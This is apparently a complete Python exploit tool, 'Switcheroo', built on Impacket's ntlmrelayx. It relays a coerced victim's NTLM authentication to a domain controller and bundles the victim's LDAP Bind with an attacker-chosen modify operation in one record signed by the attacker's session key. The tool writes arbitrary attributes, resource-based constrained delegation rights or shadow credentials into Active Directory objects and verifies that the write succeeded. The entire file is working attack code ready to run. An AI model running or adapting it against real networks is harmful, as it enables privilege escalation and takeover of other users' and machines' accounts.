import argparse
import os
import random
import runpy
import shutil
import struct
import sys
import time
from struct import unpack

from impacket.examples.utils import parse_target

import re
import string

from cryptography import x509
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

from dsinternals.system.Guid import Guid
from dsinternals.system.DateTime import DateTime
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.hello.KeyCredential import KeyCredential

import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Switcheroo - LDAP signing bypass during reauthentication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "target", action="store",
        help="[[domain/]username[:password]@]<targetName or address> - the attacker-controlled "
             "account that opens the initial signed LDAP connection, and the target DC",
    )
    parser.add_argument("-ts", action="store_true", help="adds a timestamp to every logging output")
    parser.add_argument("-debug", action="store_true", help="turn DEBUG output ON")

    group = parser.add_argument_group("authentication")
    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH",
                       help="NTLM hashes for the attacker account, format LMHASH:NTHASH")
    group.add_argument("-no-pass", action="store_true", help="don't ask for password (useful with -hashes)")
    group.add_argument("-dc-ip", action="store", metavar="ip address",
                       help="IP address of the target DC. If omitted, the targetName from the "
                            "target argument is used")
    group.add_argument("-base-dn", action="store", metavar="DN", required=True,
                       help="search base, e.g. DC=example,DC=com")

    group = parser.add_argument_group("relay listener")
    group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
                       help="path to ntlmrelayx.py from the pinned Impacket tree "
                            "(default: search PATH)")
    group.add_argument("-listen-ip", action="store", metavar="ip address", required=True,
                       help="attacker listener IP the coerced victim connects to")
    group.add_argument("-victim", action="store", metavar="DOMAIN/account",
                       help="only relay this victim; others are rejected")

    group = parser.add_argument_group("attack (operation executed as the victim)")
    group.add_argument("-modify-dn", action="store", metavar="DN", required=True,
                       help="DN of the directory object to modify as the victim")
    group.add_argument("-attribute", action="store", default="description",
                       help="attribute to write with -value/-value-hex (default: description)")
    payload = group.add_mutually_exclusive_group(required=True)
    payload.add_argument("-value", action="store", help="UTF-8 attribute value")
    payload.add_argument("-value-hex", action="store", help="binary attribute value as hex")
    payload.add_argument("-rbcd-sid", action="store", metavar="SID",
                         help="write an RBCD descriptor granting this SID (msDS-AllowedToActOnBehalfOfOtherIdentity)")
    payload.add_argument("-shadow-creds", action="store_true",
        help="Generate a shadow credential certificate and insert it into msDS-KeyCredentialLink "
        "attribute, use modify-dn entry for the certificate generation")

    sc_group = parser.add_argument_group(
        "shadow credentials options (only valid with -shadow-creds)"
    )
    sc_group.add_argument("-sc-export", choices=["PEM", "PFX"], type=lambda s: s.upper(),
        default="PFX", help="shadow creds certificate export format (default: PFX)")
    sc_group.add_argument("-sc-filename", default=None,
        help="name of the generated certificate (default: common name of the object)")
    sc_group.add_argument("-sc-password", default=None,
        help="password for the PFX (default: random)")
    sc_group.add_argument("-sc-delete", action="store_true",
        default=False, help="Force the deletion of msDS-KeyCredentialLink")
    return parser


args = build_parser().parse_args()

# domain/username:password@targetName  (Impacket-style credential + target parsing).
# Logging/banner are left to ntlmrelayx (run below) to avoid duplicate handlers.
domain, username, password, address = parse_target(args.target)
if not username:
    sys.exit("[-] username is required: domain/username[:password]@host")
lmhash = nthash = ""
if args.hashes:
    lmhash, _, nthash = args.hashes.partition(":")
if not password and not nthash and not args.no_pass:
    from getpass import getpass
    password = getpass("Password:")

# Normalise to the names the rest of the script uses.
ldap_host = address
ldap_ip = args.dc_ip or address
expected_victim = args.victim.replace("/", "\\") if args.victim else None

from impacket import ntlm
from impacket.examples.ntlmrelayx import clients as relay_clients
from impacket.examples.ntlmrelayx.clients import ldaprelayclient
from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
from impacket.ldap.ldap import LDAPConnection, get_entry_values
from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
from impacket.nt_errors import STATUS_ACCESS_DENIED
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from pyasn1.codec.ber import decoder, encoder


def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_cn(dn):
    match = re.match(r"CN=([^,]+)", dn, re.IGNORECASE)
    if match:
        return match.group(1)
    return random_string(8)

def export_pfx(pem_cert_file, pem_key_file, pfx_password, out_file):
    with open(pem_cert_file, 'rb') as f:
        pem_cert_data = f.read()
    with open(pem_key_file, 'rb') as f:
        pem_key_data = f.read()

    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())

    if pfx_password is None:
        encryption_algo = NoEncryption()
    else:
        encryption_algo = BestAvailableEncryption(pfx_password.encode('utf-8'))

    pfx_data = serialize_key_and_certificates(
        name=b"ShadowCredentialCert",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )

    with open(out_file, 'wb') as f:
        f.write(pfx_data)


def generate_shadow_credential(subject, owner_dn, export_type, password, path):
    print("[+] Generate certificate")
    certificate = X509Certificate2(subject=subject, keySize=2048, notBefore=(-40365), notAfter=(40365))

    print("[*] Generate key credentials")
    key_credential = KeyCredential.fromX509Certificate2(
        certificate=certificate,
        deviceId=Guid(),
        owner=owner_dn,
        currentTime=DateTime(),
        isComputerKey=True
    )
    print(f"[+] KeyCredential generated with DeviceID: {key_credential.DeviceId.toFormatD()}")

    if path is None:
        path = random_string(8)
        print(f"[i] No certificate filename found, will use: {path}")

    if export_type == "PEM":
        certificate.ExportPEM(path_to_files=path)
        print(f"[+] Certificate PEM saved: {path}_cert.pem")
        print(f"[+] Private key PEM saved: {path}_priv.pem")

    elif export_type == "PFX":
        if password is None:
            password = random_string(20)
            print(f"[i] no password found, will use password: {password}")

        certificate.ExportPEM(path_to_files=path)
        pem_cert_file = f"{path}_cert.pem"
        pem_key_file = f"{path}_priv.pem"
        out_pfx_file = f"{path}.pfx"

        export_pfx(pem_cert_file, pem_key_file, password, out_pfx_file)
        print(f"[+] PFX certifcate generated: {out_pfx_file}")
        print(f"[i] PFX Password: {password}")

    # Format LDIF complet : "B:<len>:<hex>:<DN>"
    dn_with_binary_str = key_credential.toDNWithBinary().toString()
    parts = dn_with_binary_str.split(':', 3)

    if len(parts) >= 3:
        print("\n" + "=" * 70)
        print("[+] Value for msDS-KeyCredentialLink :")
        print("=" * 70)
        print(dn_with_binary_str)
        print("=" * 70)
        return dn_with_binary_str.encode()
    else:
        print("[!] Erreur: can't extract hexadecimal value")
        return None


def configure_smb_listener():
    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the
    victim performs a signed SMB handshake (closer to real coercion targets)."""
    from impacket.examples.ntlmrelayx.servers import smbrelayserver
    from impacket import smb3

    original = smbrelayserver.SMBRelayServer.SmbNegotiate

    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
        result = original(self, conn_id, smb_server, request, isSMB1)
        if not result or not result[1]:
            return result
        response = result[1][0]["Data"]
        response["SecurityMode"] = (
            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
        )
        if isSMB1:
            # Steer the client onto the SMB2 wildcard so it follows up with a
            # context-bearing SMB2 Negotiate instead of locking to SMB 2.0.2.
            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
            response["NegotiateContextCount"] = 0
            response["NegotiateContextOffset"] = 0
            return result

        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
        preauth = struct.pack(
            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
        ) + preauth_data
        response["DialectRevision"] = smb3.SMB2_DIALECT_311
        response["NegotiateContextCount"] = 1
        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
        response["NegotiateContextOffset"] = context_offset
        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
        response["NegotiateContextList"] = preauth
        return result

    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate


def resolve_ntlmrelayx():
    for candidate in (args.ntlmrelayx, shutil.which("ntlmrelayx.py"), shutil.which("ntlmrelayx")):
        if candidate and os.path.isfile(candidate):
            return os.path.abspath(candidate)
    raise SystemExit("ntlmrelayx.py not found; pass --ntlmrelayx /path/to/ntlmrelayx.py")


def ldap_message(operation):
    message = LDAPMessage()
    message["messageID"] = random.randrange(1, 2147483647)
    message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
    return encoder.encode(message)


def gss_token(token):
    """Wrap a raw SPNEGO token in an LDAP SASL (GSS-SPNEGO) BindRequest."""
    request = BindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    request["authentication"]["sasl"]["credentials"] = token
    return request


def operation_value():
    """Return (attribute, value) for the attacker-chosen ModifyRequest."""
    if args.rbcd_sid:
        descriptor = create_empty_sd()
        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd_sid))
        return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()
    if args.value_hex:
        return args.attribute, bytes.fromhex(args.value_hex)
    if args.shadow_creds:
        owner_dn = args.modify_dn
        cn_value = extract_cn(owner_dn)
        subject = f"CN={cn_value}"
        cert_filename = args.sc_filename
        if args.sc_filename is None:
            cert_filename = cn_value
        value = generate_shadow_credential(
            subject,
            owner_dn,
            args.sc_export,
            args.sc_password,
            cert_filename
        )
        if value is None:
            parser.error("Failed to generate shadow credential")
        return "msDS-KeyCredentialLink", value
    return args.attribute, args.value.encode()


def replace_attribute(attribute, value):
    request = ModifyRequest()
    request["object"] = args.modify_dn
    request["changes"][0]["operation"] = 2  # replace
    request["changes"][0]["modification"]["type"] = attribute
    request["changes"][0]["modification"]["vals"].setComponents(value)
    return request

def clear_attribute(attribute):
    request = ModifyRequest()
    request["object"] = args.modify_dn
    request["changes"][0]["operation"] = 1  # delete
    request["changes"][0]["modification"]["type"] = attribute
    return request

def read_exact(sock, length):
    value = b""
    while len(value) < length:
        chunk = sock.recv(length - len(value))
        if not chunk:
            raise EOFError("connection closed")
        value += chunk
    return value


class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
    """ntlmrelayx LDAP client that drives the same-record bypass."""

    def initConnection(self):
        # The attacker's own signed LDAP session; its session key is known to us.
        self.raw = LDAPConnection(
            f"ldap://{ldap_host}", args.base_dn,
            dstIp=ldap_ip, signing=True, timeout=8,
        )
        self.raw.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
        print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
        # Log the exported SASL session key of our own connection -- the key we sign
        # the same-record frame with, and the key the DC verifies that frame under.
        try:
            cipher = self.raw._LDAPConnection__spnego_cipher_blob
            key = getattr(cipher, "_SPNEGOCipher__randomSessionKey", None) or \
                  getattr(cipher, "randomSessionKey", None)
            if key:
                print(f"[key] attacker exported session key: {bytes(key).hex()}", flush=True)
        except Exception:
            pass
        self.session = self.raw
        return True

    def sendNegotiate(self, negotiateMessage):
        # Forward the victim's NTLM Type 1 to the DC in a GSS-SPNEGO Bind and relay
        # back the DC's Type 2 challenge unchanged.
        type1 = ntlm.NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = SPNEGO_NegTokenInit()
        blob["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = type1.getData()

        type1_request = gss_token(blob.getData())
        answer = self.raw.sendReceive(type1_request)
        result = answer[0]["protocolOp"]["bindResponse"]
        code = int(result["resultCode"])
        if code != int(ResultCode("saslBindInProgress")):
            raise RuntimeError(f"GSS-SPNEGO Type 1 rejected: {ResultCode(code).prettyPrint()}")
        target_spnego = SPNEGO_NegTokenResp(result["serverSaslCreds"].asOctets())
        challenge = ntlm.NTLMAuthChallenge()
        challenge.fromString(target_spnego["ResponseToken"])
        print("[+] Relayed DC Type 2 challenge back to the victim", flush=True)
        return challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        # The victim's NTLM Type 3 arrives here. Place the final victim Bind and the
        # attacker's ModifyRequest into ONE SASL record signed with the attacker's key.
        token = authenticateMessageBlob
        if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)["ResponseToken"]
        type3 = ntlm.NTLMAuthChallengeResponse()
        type3.fromString(token)
        encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
        victim = "%s\\%s" % (
            type3["domain_name"].decode(encoding),
            type3["user_name"].decode(encoding),
        )
        if expected_victim and victim.casefold() != expected_victim.casefold():
            print(f"[-] Rejected unexpected victim {victim}", flush=True)
            return None, STATUS_ACCESS_DENIED

        attribute, value = operation_value()
        final = SPNEGO_NegTokenResp()
        final["ResponseToken"] = token
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
            final["mechListMIC"] = authenticateMessageBlob[-16:]

        bind_message = ldap_message(gss_token(final.getData()))

        if args.shadow_creds and args.sc_delete:
            modify_message = ldap_message(clear_attribute(attribute))
        else:
            modify_message = ldap_message(replace_attribute(attribute, value))

        # The two messages, concatenated, protected as a single SASL record with the
        # attacker's own session key. This is the crux of the bypass.
        record = bind_message + modify_message
        wire = self.raw.encrypt(record)
        self.raw._socket.sendall(wire)
        print(f"[+] Sent same-record frame: victim={victim} dn={args.modify_dn} "
              f"attribute={attribute}", flush=True)

        # Read the two in-record responses (Bind, then Modify) so the DC's verdict is visible.
        for label in ("Bind", "Modify"):
            try:
                length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
                plaintext = self.raw.decrypt(struct.pack(">I", length) + read_exact(self.raw._socket, length))
                message, _ = decoder.decode(plaintext, asn1Spec=LDAPMessage())
                result = message["protocolOp"].getComponent()
                print(f"[+]   {label} -> {result['resultCode'].prettyPrint()} "
                      f"{bytes(result['diagnosticMessage']).decode(errors='replace')[:80]}", flush=True)
            except Exception as error:
                print(f"[!]   {label} response unavailable: {type(error).__name__}: {error}", flush=True)

        self._verify(attribute, value)
        # Close the victim's SMB exchange; relay/coercion tools may show FAILED anyway.
        return None, STATUS_ACCESS_DENIED

    
    def _verify(self, attribute, value):
        """Independent signed connection read-back — the only reliable success signal."""
        time.sleep(1)
        try:
            check = LDAPConnection(
                f"ldap://{ldap_host}", args.base_dn,
                dstIp=ldap_ip, signing=True, timeout=8,
            )
            check.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")
            entries = check.search(
                searchBase=args.modify_dn, scope=0,
                searchFilter="(objectClass=*)", attributes=[attribute],
            )
            found = []
            for entry in entries:
                found.extend(item.asOctets() for item in get_entry_values(entry, attribute))
            check.close()

            def extract_hex(raw):
                """For DN-Binary syntax (e.g. msDS-KeyCredentialLink), extract only
                the hex payload, ignoring DN formatting differences."""
                try:
                    text = raw.decode("utf-8", errors="ignore")
                    parts = text.split(":", 3)
                    if len(parts) >= 3 and parts[0] == "B":
                        return parts[2].lower()
                except Exception:
                    pass
                return None

            expected_hex = extract_hex(value)
            if expected_hex:
                match = any(extract_hex(item) == expected_hex for item in found)
            else:
                match = value in found

            if match:
                print("[+] SUCCESS: target object now contains the attacker value", flush=True)
            else:
                print("[-] target did not contain the requested value", flush=True)
        except Exception as error:
            print(f"[!] verification unavailable: {type(error).__name__}: {error}", flush=True)

    def killConnection(self):
        try:
            self.raw.close()
        except Exception:
            pass
        self.session = None


relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
configure_smb_listener()

sys.argv = [
    "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
    "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
    "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
    "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
]
if args.debug:
    sys.argv.append("-debug")
if args.ts:
    sys.argv.append("-ts")
runpy.run_path(resolve_ntlmrelayx(), run_name="__main__")
